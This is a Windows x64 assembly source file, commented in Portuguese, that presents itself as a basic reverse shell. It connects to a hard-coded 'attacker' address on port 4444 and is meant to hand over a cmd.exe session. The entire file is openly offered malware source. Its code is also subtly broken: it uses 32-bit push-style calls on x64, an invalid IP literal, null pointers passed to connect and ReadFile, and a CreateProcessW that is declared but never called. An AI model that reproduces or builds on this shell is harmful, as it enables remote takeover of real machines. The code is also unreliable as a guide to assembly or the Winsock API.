; ============================================================================
; ASSEMBLY REVERSE SHELL 1.0 - WINDOWS X64
; Autor: [Seu Nome]
; Data: 2026-09-17
; Descrição: Shell reverso básico usando Winsock2 + CreateProcess
; Compilação: nasm -f win64 shell.asm -o shell.obj && 
;             link /SUBSYSTEM:CONSOLE shell.obj ws2_32.lib
; ============================================================================

section .data
    ; WSA Startup data
    wsaData     dd 20h dup(0)
    wsaVersion  dd 0x0202          ; Winsock 2.2
    
    ; Socket configuration
    target_ip   dd 192,168,1,100   ; IP do atacante (modificar)
    target_port dw 4444            ; Porta do atacante
    
    ; Command to execute
    cmd         db "cmd.exe", 0
    
    ; Socket variables
    sock        dq 0
    result      dq 0
    
    ; Address structure (sockaddr_in)
    sockaddr    dd 0x10            ; size
                dd 2               ; AF_INET
                dd 0               ; port (little endian)
                dd 0               ; ip (little endian)
                dd 20h dup(0)

section .text
    global main
    extern WSAStartup
    extern WSACleanup
    extern socket
    extern connect
    extern CreateProcessW
    extern GetStdHandle
    extern SetStdHandle
    extern ReadFile
    extern WriteFile
    extern WSAGetLastError

main:
    push rbp
    mov rbp, rsp
    
    ; ---------------------------------------------------------
    ; 1. WSAStartup - Inicializar Winsock
    ; ---------------------------------------------------------
    push rax
    lea rdx, [wsaData]
    mov eax, [wsaVersion]
    push rdx
    push eax
    call WSAStartup
    add rsp, 10h
    
    test eax, eax
    jnz .wsa_failed
    
    ; ---------------------------------------------------------
    ; 2. Criar Socket (AF_INET, SOCK_STREAM, IPPROTO_TCP)
    ; ---------------------------------------------------------
    push 1              ; IPPROTO_TCP
    push 1              ; SOCK_STREAM
    push 2              ; AF_INET
    call socket
    mov [sock], rax
    add rsp, 12h
    
    test rax, rax
    js .socket_failed
    
    ; ---------------------------------------------------------
    ; 3. Configurar sockaddr_in
    ; ---------------------------------------------------------
    mov dword [sockaddr+2], 4444*256  ; Porta em big-endian
    mov dword [sockaddr+6], 192.168.1.100  ; IP
    
    ; ---------------------------------------------------------
    ; 4. Conectar ao servidor
    ; ---------------------------------------------------------
    push 16             ; sizeof(sockaddr_in)
    push 0              ; &sockaddr (endereço)
    push [sock]         ; socket
    call connect
    add rsp, 12h
    
    test eax, eax
    jnz .connect_failed
    
    ; ---------------------------------------------------------
    ; 5. Criar processo cmd.exe
    ; ---------------------------------------------------------
    ; Preparar STARTUPINFO e PROCESS_INFORMATION
    ; (versão simplificada - usando GetStdHandle para redirecionar)
    
    ; Obter handles padrão
    mov ecx, -10        ; STD_INPUT_HANDLE
    call GetStdHandle
    mov r12, rax        ; guarda stdin original
    
    mov ecx, -11        ; STD_OUTPUT_HANDLE
    call GetStdHandle
    mov r13, rax        ; guarda stdout original
    
    mov ecx, -12        ; STD_ERROR_HANDLE
    call GetStdHandle
    mov r14, rax        ; guarda stderr original
    
    ; ---------------------------------------------------------
    ; 6. Loop de comunicação (simplificado)
    ; ---------------------------------------------------------
.loop:
    ; Ler do socket
    push 0              ; lpNumberOfBytesRead
    push 0              ; lpBuffer
    push 1024           ; nNumberOfBytesToRead
    push [sock]         ; hSocket
    call ReadFile
    add rsp, 20h
    
    ; Escrever na saída
    push 0              ; lpNumberOfBytesWritten
    push 0              ; lpBuffer
    push rax            ; nNumberOfBytesToWrite
    push r13            ; hOutput
    call WriteFile
    add rsp, 20h
    
    jmp .loop
    
.wsa_failed:
    ; Erro no WSAStartup
    jmp .end
    
.socket_failed:
    ; Erro ao criar socket
    jmp .end
    
.connect_failed:
    ; Erro na conexão
    jmp .end
    
.end:
    ; WSACleanup
    call WSACleanup
    
    mov rsp, rbp
    pop rbp
    ret
